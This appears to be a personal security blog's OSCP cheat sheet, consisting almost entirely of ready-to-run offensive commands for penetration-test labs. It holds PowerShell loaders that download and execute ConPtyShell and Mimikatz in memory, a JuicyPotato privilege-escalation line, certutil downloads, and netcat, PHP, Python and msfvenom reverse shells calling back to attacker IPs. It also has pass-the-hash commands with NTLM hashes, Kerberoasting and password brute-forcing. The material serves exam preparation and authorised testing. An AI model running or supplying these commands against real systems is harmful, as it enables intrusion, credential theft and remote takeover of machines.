<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>OSCP | Tool usage | MrJcK</title><meta name=keywords content><meta name=description content="Powershell
ConPtyShell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.119.160 -RemotePort 4444 -Rows 24 -Cols 80 Execute mimikatz directly in memory
IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.119.160:4444/Invoke-Mimikatz.ps1’);Invoke-Mimikatz JuicyPotato
JuicyPotato -l 1337 -p c:32.exe -a “/c powershell.exe IEX(IWR http://192.168.119.160/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.119.160 -RemotePort 4444 -Rows 24 -Cols 80” -t * File Transfer
certutil.exe -urlcache -f http://192.168.119.203/PsExec.exe PsExec.exe C:Defender\4.18.2008.9-0.exe -url -path MpCmdRun.exe -DownloadFile -url [url] -path [path_to_save_file] renamed.exe -urlcache -f -split http://7-zip.org/a/7z1604-x64.exe… 7zip.exe –download file Remote login using Psexec"><meta name=author content><link rel=canonical href=https://mrjck.github.io/posts/oscp-tool-usage/><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://mrjck.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://mrjck.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://mrjck.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://mrjck.github.io/apple-touch-icon.png><link rel=mask-icon href=https://mrjck.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="OSCP | Tool usage"><meta property="og:description" content="Powershell
ConPtyShell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.119.160 -RemotePort 4444 -Rows 24 -Cols 80 Execute mimikatz directly in memory
IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.119.160:4444/Invoke-Mimikatz.ps1’);Invoke-Mimikatz JuicyPotato
JuicyPotato -l 1337 -p c:32.exe -a “/c powershell.exe IEX(IWR http://192.168.119.160/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.119.160 -RemotePort 4444 -Rows 24 -Cols 80” -t * File Transfer
certutil.exe -urlcache -f http://192.168.119.203/PsExec.exe PsExec.exe C:Defender\4.18.2008.9-0.exe -url -path MpCmdRun.exe -DownloadFile -url [url] -path [path_to_save_file] renamed.exe -urlcache -f -split http://7-zip.org/a/7z1604-x64.exe… 7zip.exe –download file Remote login using Psexec"><meta property="og:type" content="article"><meta property="og:url" content="https://mrjck.github.io/posts/oscp-tool-usage/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-07-15T18:56:21+03:00"><meta property="article:modified_time" content="2023-07-15T18:56:21+03:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="OSCP | Tool usage"><meta name=twitter:description content="Powershell
ConPtyShell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.119.160 -RemotePort 4444 -Rows 24 -Cols 80 Execute mimikatz directly in memory
IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.119.160:4444/Invoke-Mimikatz.ps1’);Invoke-Mimikatz JuicyPotato
JuicyPotato -l 1337 -p c:32.exe -a “/c powershell.exe IEX(IWR http://192.168.119.160/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.119.160 -RemotePort 4444 -Rows 24 -Cols 80” -t * File Transfer
certutil.exe -urlcache -f http://192.168.119.203/PsExec.exe PsExec.exe C:Defender\4.18.2008.9-0.exe -url -path MpCmdRun.exe -DownloadFile -url [url] -path [path_to_save_file] renamed.exe -urlcache -f -split http://7-zip.org/a/7z1604-x64.exe… 7zip.exe –download file Remote login using Psexec"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://mrjck.github.io/posts/"},{"@type":"ListItem","position":3,"name":"OSCP | Tool usage","item":"https://mrjck.github.io/posts/oscp-tool-usage/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"OSCP | Tool usage","name":"OSCP | Tool usage","description":"Powershell\nConPtyShell\nIEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.119.160 -RemotePort 4444 -Rows 24 -Cols 80 Execute mimikatz directly in memory\nIEX (New-Object Net.WebClient).DownloadString(‘http://192.168.119.160:4444/Invoke-Mimikatz.ps1’);Invoke-Mimikatz JuicyPotato\nJuicyPotato -l 1337 -p c:32.exe -a “/c powershell.exe IEX(IWR http://192.168.119.160/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.119.160 -RemotePort 4444 -Rows 24 -Cols 80” -t * File Transfer\ncertutil.exe -urlcache -f http://192.168.119.203/PsExec.exe PsExec.exe C:Defender\\4.18.2008.9-0.exe -url -path MpCmdRun.exe -DownloadFile -url [url] -path [path_to_save_file] renamed.exe -urlcache -f -split http://7-zip.org/a/7z1604-x64.exe… 7zip.exe –download file Remote login using Psexec","keywords":[],"articleBody":"Powershell\nConPtyShell\nIEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.119.160 -RemotePort 4444 -Rows 24 -Cols 80 Execute mimikatz directly in memory\nIEX (New-Object Net.WebClient).DownloadString(‘http://192.168.119.160:4444/Invoke-Mimikatz.ps1’);Invoke-Mimikatz JuicyPotato\nJuicyPotato -l 1337 -p c:32.exe -a “/c powershell.exe IEX(IWR http://192.168.119.160/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.119.160 -RemotePort 4444 -Rows 24 -Cols 80” -t * File Transfer\ncertutil.exe -urlcache -f http://192.168.119.203/PsExec.exe PsExec.exe C:Defender\\4.18.2008.9-0.exe -url -path MpCmdRun.exe -DownloadFile -url [url] -path [path_to_save_file] renamed.exe -urlcache -f -split http://7-zip.org/a/7z1604-x64.exe… 7zip.exe –download file Remote login using Psexec\nPsexec.exe /accepteula -u alice -p alicewashere nc.exe 192.168.119.160 443 -e “c:32.exe” Python BloodHound\npython3 bloodhound-python -u alice -p ThisIsTheUsersPassword01 -d svcorp.com -gc sv-dc01.svcorp.com -c all -ns 10.11.1.20 Linux\nPassTheHash psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb administrator@10.11.1.21 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb //10.11.1.24 cmd Brute Force crackmapexec smb 10.11.1.21 -u user.txt -p ThisIsTheUsersPassword21 –continue-on-success Impackets Get SPN tickets:\nGetUserSPNs.py -request -dc-ip 10.11.1.20 svcorp.com/alice Check ASREPRoast Domain:\nGetNPUsers.py -dc-ip 10.11.1.20 -request 'svcorp.com/' Create local server impacket-smbserver mrjck $(pwd) SSH Local Port Forwarding ssh -L 80:127.0.0.1:80 username@192.168.0.1 Web Fuzzing ffuf ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.12.1.2/FUZZ hydra hydra -l root@localhost -P docswords.txt 10.11.1.39 http-post-form “/otrs/index.pl:Action=Login\u0026RequestedURL=\u0026Lang=en\u0026TimeOffset=-120\u0026User=USER\u0026Password=PASS:F=Login failed” -I Reverse Shell msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp lhost=192.168.119.160 lport=9999 -b \"\\x00\" -f exe -o rshell.exe msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.203 LPORT=4444 -f hta-psh -o evil.hta msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.160 LPORT=4444 EXITFUNC=thread -f asp -a x86 --platform windows -o metasp.asp msfvenom -p php/reverse_php LHOST=192.168.119.160 LPORT=4444 -f raw \u003e shell.php \u003c?php echo shell_exec(\"bash -i \u003e\u0026 /dev/tcp/10.11.0.59/443 0\u003e\u00261\");?\u003e python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.119.160\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' Tool Usage rpcclient -U \"svcorp\\alice\" 10.11.1.20 mssqlclient.py sa@10.11.1.31 -windows-auth smbmap -d svcorp -u alice -p ThisIsTheUsersPassword01 -H 10.11.1.20 -R 'IPC$' -A lsass -q wpscan --url http://10.12.1.7 --enumerate ap --plugins-detection aggressive rsync -Pavz Twisted-20.3.0.tar.bz2 gibson@10.11.1.71:~/. ssh-copy-id gibson@10.11.1.71 ","wordCount":"269","inLanguage":"en","datePublished":"2023-07-15T18:56:21+03:00","dateModified":"2023-07-15T18:56:21+03:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://mrjck.github.io/posts/oscp-tool-usage/"},"publisher":{"@type":"Organization","name":"MrJcK","logo":{"@type":"ImageObject","url":"https://mrjck.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://mrjck.github.io accesskey=h title="MrJcK (Alt + H)"><img src=https://mrjck.github.io/logo.png alt aria-label=logo height=60>MrJcK</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://mrjck.github.io/myconfig title=MyConfig><span>MyConfig</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://mrjck.github.io>Home</a>&nbsp;»&nbsp;<a href=https://mrjck.github.io/posts/>Posts</a></div><h1 class=post-title>OSCP | Tool usage</h1><div class=post-meta><span title='2023-07-15 18:56:21 +0300 +03'>July 15, 2023</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;269 words</div></header><div class=post-content><p><strong>Powershell</strong></p><ul><li><p>ConPtyShell</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>IEX(IWR https<span style=color:#960050;background-color:#1e0010>:</span>//raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp <span style=color:#ae81ff>192.168</span>.119.160 -RemotePort <span style=color:#ae81ff>4444</span> -Rows <span style=color:#ae81ff>24</span> -Cols <span style=color:#ae81ff>80</span>
</span></span></code></pre></div></li><li><p>Execute mimikatz directly in memory</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>IEX (New-Object Net.WebClient).DownloadString(<span style=color:#960050;background-color:#1e0010>‘</span>http<span style=color:#960050;background-color:#1e0010>:</span>//<span style=color:#ae81ff>192.168</span>.119.<span style=color:#ae81ff>160</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>4444</span>/Invoke-Mimikatz.ps1<span style=color:#960050;background-color:#1e0010>’</span>);Invoke-Mimikatz
</span></span></code></pre></div></li><li><p>JuicyPotato</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>JuicyPotato -l <span style=color:#ae81ff>1337</span> -p c:<span style=color:#ae81ff>32</span>.exe -a <span style=color:#960050;background-color:#1e0010>“</span>/c powershell.exe IEX(IWR http<span style=color:#960050;background-color:#1e0010>:</span>//<span style=color:#ae81ff>192.168</span>.119.<span style=color:#ae81ff>160</span>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp <span style=color:#ae81ff>192.168</span>.119.160 -RemotePort <span style=color:#ae81ff>4444</span> -Rows <span style=color:#ae81ff>24</span> -Cols <span style=color:#ae81ff>80</span><span style=color:#960050;background-color:#1e0010>”</span> -t *
</span></span></code></pre></div></li><li><p>File Transfer</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>certutil.exe -urlcache <span style=color:#f92672>-f</span> http<span style=color:#960050;background-color:#1e0010>:</span>//<span style=color:#ae81ff>192.168</span>.119.<span style=color:#ae81ff>203</span>/PsExec.exe PsExec.exe
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>C:Defender\<span style=color:#ae81ff>4.18</span>.2008.<span style=color:#ae81ff>9</span>-<span style=color:#ae81ff>0</span>.exe -url  -path
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>MpCmdRun.exe -DownloadFile -url [<span style=color:#66d9ef>url</span>] -path [<span style=color:#66d9ef>path_to_save_file</span>]
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>renamed.exe -urlcache <span style=color:#f92672>-f</span> -split http<span style=color:#960050;background-color:#1e0010>:</span>//<span style=color:#ae81ff>7</span>-zip.org/a/7z1604-x64.exe<span style=color:#960050;background-color:#1e0010>…</span> 7zip.exe <span style=color:#960050;background-color:#1e0010>–</span>download file
</span></span></code></pre></div></li><li><p>Remote login using Psexec</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Psexec.exe /accepteula -u alice -p alicewashere nc.exe 192.168.119.160 <span style=color:#ae81ff>443</span> -e “c:32.exe”
</span></span></code></pre></div></li><li><p>Python BloodHound</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>python3 bloodhound-python -u alice -p ThisIsTheUsersPassword01 -d svcorp.com -gc sv-dc01.svcorp.com -c all -ns <span style=color:#ae81ff>10.11</span>.1.20
</span></span></code></pre></div></li></ul><p><strong>Linux</strong></p><ul><li>PassTheHash</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb administrator@10.11.1.21
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb //10.11.1.24 cmd
</span></span></code></pre></div><ul><li>Brute Force</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>crackmapexec smb 10.11.1.21 -u user.txt -p ThisIsTheUsersPassword21 –continue-on-success
</span></span></code></pre></div><ul><li>Impackets</li></ul><p><code>Get SPN tickets:</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GetUserSPNs.py -request -dc-ip 10.11.1.20 svcorp.com/alice
</span></span></code></pre></div><p><code>Check ASREPRoast Domain:</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GetNPUsers.py -dc-ip 10.11.1.20 -request <span style=color:#e6db74>&#39;svcorp.com/&#39;</span>
</span></span></code></pre></div><ul><li>Create local server</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>impacket-smbserver mrjck <span style=color:#66d9ef>$(</span>pwd<span style=color:#66d9ef>)</span>
</span></span></code></pre></div><h2 id=ssh>SSH<a hidden class=anchor aria-hidden=true href=#ssh>#</a></h2><ul><li>Local Port Forwarding</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh -L 80:127.0.0.1:80 username@192.168.0.1
</span></span></code></pre></div><h2 id=web-fuzzing>Web Fuzzing<a hidden class=anchor aria-hidden=true href=#web-fuzzing>#</a></h2><ul><li>ffuf</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.12.1.2/FUZZ
</span></span></code></pre></div><ul><li>hydra</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>hydra -l root@localhost -P docswords.txt 10.11.1.39 http-post-form “/otrs/index.pl:Action<span style=color:#f92672>=</span>Login&amp;RequestedURL<span style=color:#f92672>=</span>&amp;Lang<span style=color:#f92672>=</span>en&amp;TimeOffset<span style=color:#f92672>=</span>-120&amp;User<span style=color:#f92672>=</span>USER&amp;Password<span style=color:#f92672>=</span>PASS:F<span style=color:#f92672>=</span>Login failed” -I
</span></span></code></pre></div><h2 id=reverse-shell>Reverse Shell<a hidden class=anchor aria-hidden=true href=#reverse-shell>#</a></h2><pre tabindex=0><code>msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp lhost=192.168.119.160 lport=9999 -b &#34;\x00&#34; -f exe -o rshell.exe

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.203 LPORT=4444 -f hta-psh -o evil.hta

msfvenom -p windows/shell_reverse_tcp  LHOST=192.168.119.160 LPORT=4444 EXITFUNC=thread -f asp -a x86 --platform windows -o metasp.asp

msfvenom -p php/reverse_php LHOST=192.168.119.160 LPORT=4444 -f raw &gt; shell.php

&lt;?php echo shell_exec(&#34;bash -i &gt;&amp; /dev/tcp/10.11.0.59/443 0&gt;&amp;1&#34;);?&gt;

python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.119.160&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;
</code></pre><h2 id=tool-usage>Tool Usage<a hidden class=anchor aria-hidden=true href=#tool-usage>#</a></h2><pre tabindex=0><code>rpcclient -U &#34;svcorp\alice&#34; 10.11.1.20

mssqlclient.py sa@10.11.1.31 -windows-auth

smbmap -d svcorp -u alice -p ThisIsTheUsersPassword01 -H 10.11.1.20 -R &#39;IPC$&#39; -A lsass -q

wpscan --url http://10.12.1.7 --enumerate ap --plugins-detection aggressive

rsync -Pavz Twisted-20.3.0.tar.bz2 gibson@10.11.1.71:~/.

ssh-copy-id gibson@10.11.1.71
</code></pre></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://mrjck.github.io/posts/windows/windows-privilege-escalation/><span class=title>« Prev</span><br><span>Windows Privilege Escalation</span></a>
<a class=next href=https://mrjck.github.io/posts/log2timeline-using-wsl/><span class=title>Next »</span><br><span>Log2timeline Using WSL</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://mrjck.github.io>MrJcK</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>